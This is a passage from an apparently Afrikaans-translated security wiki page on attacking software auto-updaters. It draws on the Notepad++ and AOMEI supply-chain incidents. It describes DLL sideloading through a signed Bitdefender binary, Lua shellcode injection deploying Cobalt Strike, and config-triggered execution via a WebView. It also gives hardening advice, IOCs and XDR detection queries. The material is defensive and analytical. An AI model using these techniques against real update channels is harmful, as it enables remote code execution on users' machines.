   - **Gebruik eie getekende binary + sideload**: bundel die getekende Bitdefender-`BluetoothService.exe` en plaas ’n kwaadwillige `log.dll` in sy soekpad. Wanneer die getekende binary loop, laai Windows `log.dll` via sideloading; dié DLL dekripteer en laai die Chrysalis-backdoor reflektief (beskerm deur Warbird + API-hashing om statiese opsporing te bemoeilik).
   - **Skripgebaseerde shellcode-inspuiting**: NSIS voer ’n saamgestelde Lua-skrip uit wat Win32-API’s (bv. `EnumWindowStationsW`) gebruik om shellcode in te spuit en Cobalt Strike Beacon te ontplooi.<sup>[[12]](#references)</sup>

Verhardings-/opsporingslesse vir enige auto-updater:
- Dwing **sertifikaat- en handtekeningverifikasie** van die afgelaaide installeerder af (pen die verskaffer se ondertekenaar vas, verwerp ’n CN/ketting wat nie ooreenstem nie) en onderteken die opdateringsmanifest self (bv. met XMLDSig). Blokkeer manifestbeheerde herleidings tensy dit gevalideer is.
- Behandel **sideloading van ’n eie getekende binary** as ’n opsporingspunt ná aflaai: waarsku wanneer ’n getekende verskaffer-EXE ’n DLL met ’n naam buite sy kanonieke installasiepad laai (bv. Bitdefender wat `log.dll` uit Temp/Downloads laai), en wanneer ’n updater installeerders met nie-verskafferhandtekeninge in temp plaas of uitvoer.
- Monitor **wanware-spesifieke artefakte** wat in hierdie ketting waargeneem is (nuttig as algemene ondersoekpunte): mutex `Global\Jdhfv_1.0.1`, abnormale `gup.exe`-skryfbewerkings na `%TEMP%` en Lua-gedrewe shellcode-inspuitingstadiums.
- Notepad++ het gereageer deur WinGUp in v8.8.9 en later te versterk: die teruggestuurde XML word nou onderteken (XMLDSig), en nuwer weergawes dwing sertifikaat- en handtekeningverifikasie van die afgelaaide installeerder af in plaas daarvan om slegs die transport te vertrou.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Sideloading van Bitdefender-getekende EXE <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> wat ’n nie-Notepad++-installeerder begin</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Hierdie patrone geld vir enige updater wat unsigned manifests aanvaar of versuim om die installer se ondertekenaars te verifieer—network hijack + malicious installer + BYO-signed sideloading lewer remote code execution onder die dekmantel van “trusted” updates.

### Kennisgewingkonfigurasie as ’n tweede opdateringsneller

’n Updater kan afsonderlike remote configurations gebruik om **inhoud gereed te maak en die uitvoering daarvan te aktiveer**. Dit vereis beheer oor die configurations of hul responses; die verslae meld nie hoe toegang tot die oorsprong verkry is nie. In die AOMEI-geval het `down_html.ini` ’n argief-URL, weergawe (`thrid`) en MD5 (`Val`) gekies; die aanvaller het die weergawe verhoog en die URL en ooreenstemmende checksum saam verander. Dit is die [metadata trust-boundary failure](#2-hijacking-the-update-channel-to-run-code-as-system) wat hierbo behandel is. Die bykomende uitvoeringspad was `Notifycfg.ini`: dit het `ABNotify.exe` opdrag gegee om ’n uitgepakte `upgrade-now.html` via ’n plaaslike `file:///`-URL in ’n WebView te laai. Die bladsy het outomaties na ’n uitvoerbare lêer in dieselfde gids gegaan, wat die WebView aan die system shell oorgegee het. Die child het die notifier se voorregte geërf; dit het hom nie vanself tot SYSTEM verhef nie.<sup>[[17]](#references)[[18]](#references)</sup>

Google het ook ’n aangepaste `Notifycfg.ini` gerapporteer met meer as 35 000 herhaalde dummy sections wat hierdie kliënt se gewone version gate omseil het. Die verslag bewys nie ’n algemene parser-bypass nie. Die aanvaller het die remote files ná vensters van vyf tot tien minute herstel, sodat slegs kliënte wat gedurende dié vensters gepoll het, die gewysigde konfigurasie ontvang het. Hierdie notification channel het ook ’n afsonderlike [WebDAV/NTLM coercion lure](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion) bevat, waarvoor die argief nie uitgevoer hoef te word nie.<sup>[[18]](#references)</sup>

---
## References
- [1] [Advies – Netskope Client for Windows – Plaaslike voorregte-eskalasie via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope-sekuriteitsadvies NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope-plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC-kliënt/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre en Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Plaaslike voorregte-eskalasie via skryfbare lêers in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Voorregte-eskalasie in Windows-agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nasiestaat-akteurs buit Notepad++-voorsieningsketting uit](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – opdatering oor die voorval met gekaapte infrastruktuur](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing die oplossing vir CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Ontdekking van voorregte-eskalasie-foute in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: Van gRPC tot SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Kompromittering van AOMEI Backupper se voorsieningsketting](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group en Mandiant – Ondersoek na tydelike knoeiery met voorsieningskettings](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
